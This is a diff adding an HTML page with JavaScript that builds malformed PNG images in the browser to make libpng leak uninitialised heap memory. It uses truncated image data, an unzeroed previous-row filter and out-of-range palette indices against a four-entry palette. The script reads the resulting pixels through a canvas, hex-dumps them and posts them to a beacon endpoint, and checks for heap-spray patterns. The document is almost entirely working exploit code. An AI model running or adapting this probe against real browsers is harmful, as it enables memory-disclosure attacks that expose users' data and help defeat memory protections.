@@ -1,0 +1,211 @@
+<!--
+  p610: PNG heap read via row-buffer overread + palette OOB index
+
+  Three independent techniques:
+  1. TRUNCATED IDAT: valid zlib stream that decompresses to fewer rows than
+     IHDR declares. If output buffer isn't zeroed, missing rows = heap residue.
+  2. UP FILTER on row 0: filter=2 references "previous row" which should be
+     zeros per spec. If libpng doesn't zero prev_row buffer → heap XOR'd in.
+  3. PALETTE OOB: indexed PNG with short PLTE (4 entries) but pixel indices
+     up to 255. libpng allocates palette[256] via png_malloc, copies only 4
+     entries. If unused entries aren't zeroed → palette[4..255] = heap data
+     visible as pixel RGB values. THIS IS THE HIGHEST VALUE TEST.
+
+  CRASH_CLASS: LOW (all well-formed PNGs, just unusual parameters)
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p610</title>
+<script>
+var bx=new XMLHttpRequest();
+function b(m){try{bx.open('GET','/beacon/'+encodeURIComponent(m),false);bx.send();}catch(e){}}
+function bp(m,d){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent(m),false);x.send(d);}catch(e){}}
+
+// === PNG Builder ===
+var CT=new Array(256);
+for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;CT[n]=c;}
+function crc(d){var c=~0;for(var i=0;i<d.length;i++)c=CT[(c^d[i])&0xFF]^(c>>>8);return(c^~0)>>>0;}
+function adr(d){var a=1,s=0;for(var i=0;i<d.length;i++){a=(a+d[i])%65521;s=(s+a)%65521;}return((s<<16)|a)>>>0;}
+function be(v){return[(v>>>24)&0xFF,(v>>>16)&0xFF,(v>>>8)&0xFF,v&0xFF];}
+
+function pk(t,d){
+    var td=[];for(var i=0;i<4;i++)td.push(t.charCodeAt(i));
+    for(var i=0;i<d.length;i++)td.push(d[i]);
+    var cr=crc(td);return be(d.length).concat(td,be(cr));
+}
+
+function zl(raw){
+    var o=[0x78,0x01];
+    if(raw.length===0){o.push(1,0,0,0xFF,0xFF);}
+    else{var p=0;while(p<raw.length){
+        var n=Math.min(raw.length-p,65535),f=p+n>=raw.length?1:0,nl=n^0xFFFF;
+        o.push(f,n&0xFF,(n>>8)&0xFF,nl&0xFF,(nl>>8)&0xFF);
+        for(var i=0;i<n;i++)o.push(raw[p+i]);p+=n;
+    }}
+    var ad=adr(raw);
+    o.push((ad>>>24)&0xFF,(ad>>>16)&0xFF,(ad>>>8)&0xFF,ad&0xFF);
+    return o;
+}
+
+function PNG(cks){
+    var a=[0x89,0x50,0x4E,0x47,0x0D,0x0A,0x1A,0x0A];
+    for(var i=0;i<cks.length;i++)for(var j=0;j<cks[i].length;j++)a.push(cks[i][j]);
+    return new Uint8Array(a);
+}
+
+var IEND=pk('IEND',[]);
+function IHDR(w,h,bd,ct){return pk('IHDR',be(w).concat(be(h),[bd,ct,0,0,0]));}
+function PLTE(e){var d=[];for(var i=0;i<e.length;i++)d.push(e[i][0],e[i][1],e[i][2]);return pk('PLTE',d);}
+
+function mkRGBA(w,h,rows){return PNG([IHDR(w,h,8,6),pk('IDAT',zl(rows)),IEND]);}
+function mkIDX(w,h,pal,rows){return PNG([IHDR(w,h,8,3),PLTE(pal),pk('IDAT',zl(rows)),IEND]);}
+
+// Row data generators
+function rgbaRows(w,nrows,filt,rv,gv,bv,av){
+    var d=[];for(var r=0;r<nrows;r++){d.push(filt);for(var x=0;x<w;x++)d.push(rv,gv,bv,av);}return d;
+}
+function idxRows(w,h,idxArr){
+    var d=[],k=0;for(var r=0;r<h;r++){d.push(0);for(var x=0;x<w;x++){d.push(idxArr[k%idxArr.length]);k++;}}return d;
+}
+
+// === Pixel Scanner ===
+function scan(img,tag){
+    try{
+        var w=img.width,h=img.height;
+        var c=document.createElement('canvas');c.width=w;c.height=h;
+        var ctx=c.getContext('2d');ctx.drawImage(img,0,0);
+        var pd=ctx.getImageData(0,0,w,h),d=pd.data;
+        var nz=0,samp=[];
+        for(var i=0;i<d.length;i+=4){
+            if(d[i]!==0||d[i+1]!==0||d[i+2]!==0){
+                nz++;
+                if(samp.length<12)samp.push((i/4)+':'+d[i]+','+d[i+1]+','+d[i+2]+','+d[i+3]);
+            }
+        }
+        b(tag+'-nz='+nz+'/'+(d.length/4));
+        if(samp.length>0)b(tag+'-S='+samp.join('|'));
+
+        // Hex dump first 128 pixels (512 bytes) via POST for palette analysis
+        if(w*h<=256){
+            var hex='';
+            for(var i=0;i<d.length&&i<512;i++)hex+=('0'+d[i].toString(16)).slice(-2);
+            bp(tag+'-HEX',hex);
+        }
+
+        // Check for spray patterns
+        var sprPat={};
+        for(var i=0;i<d.length;i+=4){
+            var r=d[i],g=d[i+1],bl=d[i+2];
+            if(r===0xCC&&g===0xCC&&bl===0xCC)sprPat['CC']=1;
+            if(r===0xDD&&g===0xDD&&bl===0xDD)sprPat['DD']=1;
+            if(r===0xEE&&g===0xEE&&bl===0xEE)sprPat['EE']=1;
+        }
+        var sp=Object.keys(sprPat);
+        if(sp.length>0)b(tag+'-SPRAY='+sp.join(','));
+
+        return nz;
+    }catch(e){b(tag+'-SCANERR='+e.message);return-1;}
+}
+
+// === Tests ===
+var T=[
+// T0: Control — valid 4x4 RGBA, all red. Verifies our PNG builder produces correct pixels.
+['CTRL-RED',function(){
+    return mkRGBA(4,4,rgbaRows(4,4,0,255,0,0,255));
+}],
+
+// T1: Control — valid 16x16 RGBA, all black transparent. Baseline for truncation tests.
+['CTRL-BLK',function(){
+    return mkRGBA(16,16,rgbaRows(16,16,0,0,0,0,0));
+}],
+
+// T2: Truncated IDAT — 16x16 RGBA declared, only 1 row in zlib stream.
+// If output buffer not zeroed: rows 2-16 contain heap residue.
+['TRUNC-1',function(){
+    return mkRGBA(16,16,rgbaRows(16,1,0,0,0,0,0));
+}],
+
+// T3: Truncated IDAT — 16x16 RGBA, 15/16 rows. Only last row missing.
+['TRUNC-15',function(){
+    return mkRGBA(16,16,rgbaRows(16,15,0,0,0,0,0));
+}],
+
+// T4: UP filter all rows — 16x16 RGBA, filter=2, raw pixels=0.
+// Row 0: recon = 0 + prev_row. If prev_row not zeroed → heap visible.
+// Rows 1-15: recon = 0 + prev_recon = propagates row 0 values.
+['UP-R0',function(){
+    return mkRGBA(16,16,rgbaRows(16,16,2,0,0,0,0));
+}],
+
+// T5: ★ PALETTE SWEEP — THE KEY TEST
+// 16x16 indexed, PLTE has 4 entries (red/green/blue/yellow).
+// Pixel indices: 0,1,2,...,255 sequentially.
+// Pixels 0-3: should show our 4 palette colors (builder verification).
+// Pixels 4-255: read palette[4]-palette[255] which are UNINITIALIZED
+// if libpng uses png_malloc (not png_calloc) for the 256-entry allocation.
+// Non-zero RGB at indices 4+ = HEAP DATA VISIBLE IN PIXELS.
+['PAL-SWEEP',function(){
+    var pal=[[255,0,0],[0,255,0],[0,0,255],[255,255,0]];
+    var idx=[];for(var i=0;i<256;i++)idx.push(i);
+    return mkIDX(16,16,pal,idxRows(16,16,idx));
+}],
+
+// T6: Palette OOB — PLTE=1 entry (red), all 256 pixels use index 128.
+// Reads palette[128] = bytes 384-386 of the 768-byte allocation.
+// If zeroed: (0,0,0,255) black. If heap: (R,G,B,255) various.
+// If clamped: (255,0,0,255) red. If error: ERR.
+['PAL-OOB128',function(){
+    var pal=[[255,0,0]];
+    var idx=[];for(var i=0;i<256;i++)idx.push(128);
+    return mkIDX(16,16,pal,idxRows(16,16,idx));
+}],
+
+// T7: Palette broad scan — 64x4 indexed, PLTE=2 entries.
+// Indices cycle 2-255 across all 256 pixels.
+// Each OOB index reads 3 bytes from palette heap allocation.
+// 254 unique indices × 3 bytes = 762 bytes of potential heap scan.
+['PAL-BROAD',function(){
+    var pal=[[255,0,0],[0,0,255]];
+    var idx=[];for(var i=0;i<256;i++)idx.push(2+(i%254));
+    return mkIDX(64,4,pal,idxRows(64,4,idx));
+}]
+];
+
+// === Sequential Runner ===
+function main(){
+    if(typeof Blob==='undefined'){b('NO-BLOB');return;}
+    b('P610-PNG-HEAP-'+T.length+'T');
+    var t0=Date.now();
+    var sk=0;try{sk=parseInt(localStorage.getItem('p610s')||'0');}catch(e){}
+    if(sk>0)b('SKIP='+sk);
+
+    function run(i){
+        if(i>=T.length){
+            b('P610-DONE-'+(Date.now()-t0)+'ms');
+            try{localStorage.removeItem('p610s');}catch(e){}
+            return;
+        }
+        try{localStorage.setItem('p610s',String(i+1));}catch(e){}
+        var name=T[i][0];
+        b('T'+i+'-'+name);
+        var data;
+        try{data=T[i][1]();}catch(e){b('T'+i+'-BUILDERR='+e.message);run(i+1);return;}
+
+        var blob=new Blob([data],{type:'image/png'});
+        var url=URL.createObjectURL(blob);
+        var img=new Image(),dn=false;
+
+        img.onload=function(){if(dn)return;dn=true;
+            b('T'+i+'-OK-'+img.width+'x'+img.height);
+            scan(img,'T'+i);
+            URL.revokeObjectURL(url);run(i+1);
+        };
+        img.onerror=function(){if(dn)return;dn=true;
+            b('T'+i+'-ERR');
+            URL.revokeObjectURL(url);run(i+1);
+        };
+        setTimeout(function(){if(!dn){dn=true;b('T'+i+'-TMO');URL.revokeObjectURL(url);run(i+1);}},8000);
+        img.src=url;
+    }
+    run(sk);
+}
+setTimeout(main,200);
+</script></head><body>p610: PNG heap read</body></html>
